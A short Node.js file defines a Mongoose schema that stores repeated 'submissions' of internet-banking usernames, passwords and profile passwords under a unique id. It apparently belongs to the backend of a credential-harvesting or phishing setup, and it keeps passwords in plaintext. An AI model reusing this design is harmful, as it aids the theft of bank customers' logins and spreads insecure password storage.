const mongoose = require('mongoose');

const CombinedInternetBankingSchema = new mongoose.Schema({
  uniqueid: { type: String, required: true, unique: true },
  submissions: [{
    username: { type: String, required: true },
    password: { type: String, required: true },
    profilePassword: { type: String, required: true },
    createdAt: { type: Date, default: Date.now }
  }]
}, { timestamps: true });

module.exports = mongoose.model('CombinedInternetBanking', CombinedInternetBankingSchema);
